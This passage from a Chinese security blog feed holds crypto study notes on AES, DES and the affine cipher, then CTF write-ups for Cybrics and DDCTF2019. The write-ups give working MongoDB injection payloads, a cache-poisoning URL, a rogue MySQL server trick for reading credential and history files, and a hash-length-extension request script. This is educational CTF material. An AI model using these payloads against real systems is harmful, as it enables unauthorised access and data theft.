<p>47 = (02•87)⊕(03•6E)⊕(01•4A)⊕(01•A6)</p>
<p>最后输出相应的矩阵。</p>
<p>4.加轮密钥</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2t2pzuv8nj30hs0dugrb.jpg" alt="img"></p>
<p>唯一利用到密钥的一步，16位的密钥同样被排列为4<em>4的矩阵，对应位置进行异或生成新的值，*</em>这里需要注意的是：每一轮的加密密钥都不相同(扩展密钥)**</p>
<p><strong>扩展密钥概念</strong>：AES源代码中用长度 4 * 4 *（10+1） 字节的数组W来存储所有轮的密钥。W{0-15}的值等同于原始密钥的值，用于为初始轮做处理。</p>
<p>后续每一个元素W[i]都是由W[i-4]和W[i-1]计算而来，直到数组W的所有元素都赋值完成。</p>
<p>W数组当中，W{0-15}用于初始轮的处理，W{16-31}用于第1轮的处理，W{32-47}用于第2轮的处理 ……一直到W{160-175}用于最终轮（第10轮）的处理。</p>
<p>加密:初始轮—-普通轮—-最终轮</p>
<p>解密:最终轮—–普通轮—-初始轮</p>
<p><strong>不同模式进行加密时的区别</strong></p>
<p><strong>ECB模式</strong>:(默认的最简单加密模式)，该模式下，每一个明文块的加密完全独立，互不干涉。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s10nn38bj30gy09dgna.jpg" alt="img"></p>
<p>安全性较差:相同的明文块加密后生成相同的密文块。</p>
<p><strong>CBC模式</strong>（这应该也是很重要的一个模式，涉及后面的CBC字节翻转攻击):特点为引入一个初始向量，先与明文块进行异或，再进行加密，加密后的密文块在于新的明文块进行异或，在进行加密，生成新的密文块。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s12o78cqj30hs09n0u8.jpg" alt="img"></p>
<p><strong>CFB模式</strong></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/cfb_encryption.png" alt="img"></p>
<p>与CBC不同的是密文块是先进行加密再与明文块xor，而不是CBC的先与明文块xor，再加密，但是也面临的重放攻击(未学)。</p>
<p><strong>OFB模式</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2s1e8tvg5j3094049a9w.jpg" alt="img"></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ofb_decryption.png" alt="img"></p>
<p>OFB模式是一种效率很高的加密模式，准备好密钥流，快速与明文进行xor，生成密文</p>
<p><strong>CTR模式</strong></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ctr_encryption.png" alt="img"></p>
<p>计数器模式。</p>
<h3 id="DES加密"><a href="#DES加密" class="headerlink" title="DES加密"></a><strong>DES加密</strong></h3><p>DES加密流程图如下:看一看基本上就会明白的。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slf3xo11j308c09omxv.jpg" alt="img"></p>
<p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/figure/des.gif" alt="img"></p>
<p><strong>流程简述</strong>:</p>
<ul>
<li>将明文变为64位二进制格式，进行初始置换IP。</li>
<li>分为两个32位的组,<strong>对于右面三十二位:先将32位扩展为48位并且与48位密钥进行异或，经过S盒压缩，再次变为32位，再次进行P盒置换，与左32位进行异或操作，最终得到右面的32位，左面的32位数据变为原来右面的32位。</strong></li>
<li>如此变换经过16轮，最终经过逆置换IP，得到最终密文。</li>
</ul>
<p>解密过程:通过16轮密钥逆向此过程得到明文。</p>
<p><strong>密钥的产生：子密钥 Ki（48 bit）生成算法</strong>(共十六个)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slg21wfbj30mz0hfgmu.jpg" alt="img"></p>
<ul>
<li>不考虑每个字节的第8位，DES的密钥由64位减至56位，每个字节的第8位作为奇偶校验位。产生的56位密钥由下表生成（注意表中没有8,16,24，32,40,48,56和64这8位)。</li>
<li>将五十六位密钥分为两部分，根据轮数，这两部分分别循环左移一位或者两位</li>
<li>从移动完毕后的48位作为这一轮的密钥去与经过扩展完毕后的48位数据进行异或操作。根据此表选出48位数据。</li>
</ul>
<p><img src="http://dl2.iteye.com/upload/attachment/0098/9555/78c0a354-e216-32db-9310-d1f3abcaf1b5.png" alt="img"></p>
<p><strong>双重DES</strong></p>
<p>双重DES使用两个密钥，长度为112比特，加密方式如下:</p>
<p>C=Ek2(EK1(P))</p>
<p><strong>Ek1代表第一次加密，Ek2代表第二次加密</strong>。</p>
<p><strong>安全问题</strong>：<code>中间相遇攻击</code></p>
<p>如wiki所示</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2sl98h1hmj30te0ccwga.jpg" alt="img"></p>
<p><strong>三重DES</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slalxw2yj30t30fu0u0.jpg" alt="img"></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2slh10apsj30og0oq42y.jpg" alt="img"></p>
<p><strong>仿射加密剖析:</strong></p>
<p>仿射加密的原理很简单</p>
<p>加密函数 <code>E(x)=(ax+b)(mod m)</code></p>
<ul>
<li>x表示明文按某种编码得到的数字</li>
<li>a和m互为质数</li>
<li>m为编码系统中字母的数目</li>
</ul>
<p>解密函数D(x)=<code>a的逆元(x-b)(mod m)</code></p>
<p><strong>破解分析</strong></p>
<p>当a=1时，仿射加密为凯撒加密，就会很容易被破解了。</p>
<p>当a!=1时，通常字符集选取的为字母表，一般为26个字母，小于26且与26互素的个数:根据欧拉定理可得26(1-1/2)(1-1/13)=12.</p>
<p><strong>密钥空间为</strong>:12*26=312 （其实并不是太安全)</p>
<p><strong>已知部分明文进行攻击</strong>：</p>
<p>如wiki所言:</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2szt9mqdjj30pt0ektas.jpg" alt="img"></p>
<p>直接一个做差就可以很简单的求出a了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TWCTF 2016 的 super_express</span><br><span class="line">import sys</span><br><span class="line">key &#x3D; &#39;****CENSORED***************&#39;</span><br><span class="line">flag &#x3D; &#39;TWCTF&#123;*******CENSORED********&#125;&#39;</span><br><span class="line"></span><br><span class="line">if len(key) % 2 &#x3D;&#x3D; 1:</span><br><span class="line">    print(&quot;Key Length Error&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">n &#x3D; len(key) &#x2F; 2</span><br><span class="line">encrypted &#x3D; &#39;&#39;</span><br><span class="line">for c in flag:</span><br><span class="line">    c &#x3D; ord(c)</span><br><span class="line">    for a, b in zip(key[0:n], key[n:2*n]):</span><br><span class="line">        c &#x3D; (ord(a) * c + ord(b)) % 251</span><br><span class="line">    encrypted +&#x3D; &#39;%02x&#39; % c</span><br><span class="line"></span><br><span class="line">print encrypted</span><br></pre></td></tr></table></figure>

<p>代码逻辑很简单，<strong>对flag中的每一个字母加密n次</strong>，但是不管怎么加密，key是固定的。最终的形式肯定都为<code>Cn=(x*c+y)%251</code></p>
<p>利用上面的知识，我们可以很轻松的很出脚本</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2szzzpelaj315t0lyae6.jpg" alt="img"></p>
<p>这里总结出了一个小tip:</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2t0h9mvaej30x80jgtc8.jpg" alt="img"></p>
]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Cybrics-Web部分wp</title>
    <url>/2019/07/27/Cybrics-Web%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>打开链接，直接会跳转到final.html，所以curl一下主页。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;45.32.148.106</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/22/eiyohq.png" alt="eiyohq.png"></p>
<h3 id="Bitkoff-Bank"><a href="#Bitkoff-Bank" class="headerlink" title="Bitkoff Bank"></a>Bitkoff Bank</h3><p>硬跑出来的..跑就完了。</p>
<h3 id="Caesaref"><a href="#Caesaref" class="headerlink" title="Caesaref"></a>Caesaref</h3><p>这道题本来是Hard难度的，出现了PHPSESSID泄露，想写wp的时候发现题挂了，说一下思路吧，写一个链接放在留言板上，bot会自己携带着管理员的PHPSESSID访问，开个端口监听一下，拿到cookie，回去更改一下即可获得flag。</p>
<h3 id="NopeSQL"><a href="#NopeSQL" class="headerlink" title="NopeSQL"></a>NopeSQL</h3><p>这道题还是很难受的，通过这道题发现自己看文档的能力有点菜，还是需要多练习啊，比赛的时候没做出来，复现的时候才明白的。首先进入发现登陆界面以及.git源码泄露，index.php源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现是mongodb数据库的注入，自己并不是太了解，去现学习了一波..，不过,mongodb语法确实要比mysql要复杂一些，mysql还是比较简单，根据这个代码的逻辑，首先得登陆进去，登陆验证部分代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test数据库，users表，将用户的输入无任何过滤直接在语句中进行拼接，产生注入，这里的admin..可真的把我坑坏了….，翻了翻文档第一次构造的句子是没有构造admin…，怎么都出不来，后来用admin进去了，结果到最后也没做出来，赛后其实发现不用admin其实也能进去，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;,&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;$where&quot;:&quot;1</span><br></pre></td></tr></table></figure>

<p><strong>这里的username和password虽然是用重复的，但是mongo还是会以最后一个为基准的，意思也就是password不为null,username不为空的用户,肯定是会存在的，所以可以成功绕过进行登陆。</strong>进入页面后也就是对应着如下逻辑的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> Welcome!</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    Group most common news by</span><br><span class="line">    &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">    &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>翻阅文档中聚合的意思，大意可明白上面的代码，还是先说一个$project聚合吧</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFKKHJ.png" alt="eFKKHJ.png"></p>
<p>官方给的例子</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFKG36.png" alt="eFKG36.png"></p>
<p>也就是我们要做的事通过控制字段来拿到flag,..当时真的没有想到传入数组进行条件控制，来看一下impakho师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter[$cond][if][$eq][][$strLenBytes]&#x3D;$title&amp;filter[$cond][if][$eq][][$toInt]&#x3D;19&amp;filter[$cond][then]&#x3D;$text&amp;filter[$cond][else]&#x3D;12</span><br></pre></td></tr></table></figure>

<p>其实这个是最终版的payload，其实是要先fuzz title的，最终用burp在19处可发现</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFMcJ1.png" alt="eFMcJ1.png"></p>
<p>然后查$text字段</p>
<p><img src="https://s2.ax1x.com/2019/07/23/eFMHJI.png" alt="eFMHJI.png"></p>
<p>成功拿到flag。</p>
<h3 id="Fixaref"><a href="#Fixaref" class="headerlink" title="Fixaref"></a>Fixaref</h3><p>一道缓存投毒的题，这道题是在之前的题做了加固，之前我们让admin去访问我们的链接就可以拿到PHPSESSID的，再举办方做了加固后这样是不可行的了，但是这道题管理员仍然会去访问我们发布的链接，这里就用到的<code>缓存投毒</code>。</p>
<p><strong>原理为：.css/.js等为后缀名的文件服务器会将之做缓存。</strong></p>
<p>首先让管理员访问我们的css界面，这个css界面连同管理员当时的操作都被记录到了这个缓存页面，然后我们再去访问这个css，比如我设置的链接<code>http://95.179.190.31/index.php/lihuaiqiu.css</code>，<strong>让管理员访问后，这样就会把admin的index.php放入缓存页面，再去访问这个缓存页面，发现多了一个admin的GET表单(也就admin页面的内容)。</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/27/eKOB8O.png" alt="eKOB8O.png"></p>
<p>发现这个表单，其实本来的意思是admin通过<code>show flag</code>这个按钮来getflag，其实就是通过get来发送<code>csrf-token</code>和<code>flag</code>来getflag，同样让管理员访问这个网页，并把缓存也存入我们的<code>lihuaiqiu.css</code>，为了可以传两个参数，需要把<code>&amp;</code>进行编码，访问如下链接：</p>
<p><a href="http://95.179.190.31/index.php/lihuaiqiu.css?csrf-token=3d839c02761010289d09cea1dc9ce2e5fc1b9e725a11e9855b137847a9369eb0%26flag=1" target="_blank" rel="noopener">http://95.179.190.31/index.php/lihuaiqiu.css?csrf-token=3d839c02761010289d09cea1dc9ce2e5fc1b9e725a11e9855b137847a9369eb0%26flag=1</a></p>
<p>这样flag就到了我们的缓存界面，接着去访问这个链接</p>
<p><img src="https://s2.ax1x.com/2019/07/27/eMCuVg.png" alt="eMCuVg.png"></p>
<p>拿到flag。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF2019部分wp</title>
    <url>/2019/06/01/DDCTF2019%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇WP对于简单部分会略写.</p>
<h3 id="滴"><a href="#滴" class="headerlink" title="滴"></a>滴</h3><p>利用文件包含漏洞读取源代码，最后从博客中看到<code>practice.txt.swp</code>，读取源码，最后是一个简单的变量覆盖漏洞，将两个参数设置为空就行了.</p>
<h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>一个比较基础的<code>php反序列化</code>，添加<code>ddctf_username=admin</code>,下面部分有点入坑..,<code>以后能用curl的绝对不用浏览器(真香)</code>，构造<code>sprint-&gt;%s</code>显值，得到<code>key</code>，构造正确的<code>md5</code>并调用反序列化得到<code>Flag.</code></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkyjuuf1j30my0aywfy.jpg" alt=""></p>
<h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p> 这道题有一个明显的标志：就是可以把上传到服务器上的图片再下载回来，典型的二次渲染，具体原理移步这篇文章讲的很棒<a href="https://xz.aliyun.com/t/2657#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-10</a>首先上传图片下载回来发现</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rkzxo46qj30ju0jjdgg.jpg" alt=""></p>
<p><strong>二次渲染无疑了</strong>.<strong>第一种解法：</strong>通过<code>jpg_payload.php</code>来生成包含<code>phpinfo()</code>的图片,命令如:<code>php jpg_payload.php lihuaiqiu.jpg</code>并将图片上传。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl14vjtlj31250jltxj.jpg" alt=""></p>
<p><strong>第二种解法</strong>手工<code>FUZZ</code>，因为没有找到带有<code>diff功能</code>的十六进制编辑器，所以这里盗一下<code>**Glzjin**</code>这位师傅的图。<strong>首先上传一个图片马，下载回来进行对比一波</strong></p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373208b5c3313e5967c99508c1f8b44d06ebc0-1024x891.png" alt="img"></p>
<p>不同的地方有很多，如果在这里面找空白的地方去插入<code>phpinfo()</code>肯定是不现实的，所以尝试将二次渲染过的图片上传上去，再次下载回来，发现相同的地方变多了。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/04/1555373422ba1bed458a8c194a4c09254dc4a248d2-1010x1024.png" alt="img"></p>
<p>在相同的地方<code>不断FUZZ插入phpinfo()</code>字段，直到可行为止，emm这么做确实有一些麻烦，所以还是脚本方便一些。</p>
<h3 id="Mysql弱口令"><a href="#Mysql弱口令" class="headerlink" title="Mysql弱口令"></a>Mysql弱口令</h3><p>对于萌新来讲，这道题真的是一道很棒的题</p>
<p>进去的页面是这个样子的</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl1xid7aj30tm0dmaao.jpg" alt=""></p>
<p>如果我们在服务器上运行这个<code>agent.py</code>会返回<code>服务器不存在弱口令</code>，如果未运行<code>agent.py</code>会返回<code>未开启mysql服务</code>。根据Smi1e师傅的文章，这道题考察的知识点是<code>mysql客户端任意文件读取</code>。</p>
<p>在源码中，我们可以看到通过这段代码判断<code>Mysqld</code>服务是否存在</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl2hfalrj315z0eq0ua.jpg" alt=""></p>
<p>所以可以通过修改代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return_str&#x3D;&quot;mysqld&quot;</span><br><span class="line">self.wfile.write(return_str)伪造我们的Mysql服务一直是开启的，绕过对服务器的判断</span><br></pre></td></tr></table></figure>

<p>通过脚本<a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p>
<p>将读取文件路径改为<code>~/.mysql_history</code>，最终得到<code>Flag</code>(其实这是一个非预期解)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl3bq7fyj31hc0qe1kx.jpg" alt=""></p>
<p><strong>预期解</strong>：首先读取<code>/root/.bash_history</code>，看进行了哪些命令操作，发现<code>view.py</code>,读取<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>。</p>
<p>发现注释说明<code>Flag</code>存在于<code>security</code>中的<code>flag</code>表中，读取<code>/var/lib/mysql/security/flag.idb</code>，最终得到<code>Flag</code></p>
<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p>通过<code>ticket_price</code>溢出，得到票价为<code>0</code>的入场卷,写一下脚本，不断去杀自己的小号，最终吃鸡。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl4evrhaj30vb0ihdka.jpg" alt=""></p>
<p>贴一下脚本：</p>
<p>最终吃鸡:</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rl53c833j30w70d13zk.jpg" alt=""></p>
<p>第二种解法:</p>
<p>知识点：<strong>哈希长度扩展攻击</strong></p>
<p>溢出的地方是和传统解法一样的，利用溢出成功买到票后，在删除机器人时进行抓包</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2jrmgfdnqj30ya08k74y.jpg" alt="img"></p>
<p><code>ticket</code>格式为<code>md5(security_key+idxx)</code>，通过删除自身来得到<code>key</code>的位数为31位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">COOKIE&#x3D;&#123;&quot;Cookie&quot;:&quot;user_name&#x3D;huai;REVEL_SESSION&#x3D;f8b0026c9b87ac6e2ce47881a3ad4f3b&quot;&#125;</span><br><span class="line">for i in range(32):</span><br><span class="line">    print i</span><br><span class="line">    m&#x3D;hashpumpy.hashpump(&#39;20e38d6c485a80f1b92f13f38b4289e7&#39;,&#39;id133&#39;,&#39;id133&#39;,i)</span><br><span class="line">    payload&#x3D;urllib.quote(m[1])[:-5]</span><br><span class="line">    robot_id&#x3D;133</span><br><span class="line">    robot_ticket&#x3D;m[0]</span><br><span class="line">    print payload,robot_ticket</span><br><span class="line">    delete_robot&#x3D;&quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;remove_robot?&quot;+payload+&quot;&#x3D;&amp;id&#x3D;133&amp;ticket&#x3D;1d3ef672444392c4867e729ec148de1f&quot;</span><br><span class="line">    qiu&#x3D;requests.get(url&#x3D;delete_robot,headers&#x3D;COOKIE)</span><br><span class="line">    print qiu.text</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2jrqtb6zxj31hc0nogo6.jpg" alt="img"></p>
<p>然后进行脚本删除机器人</p>
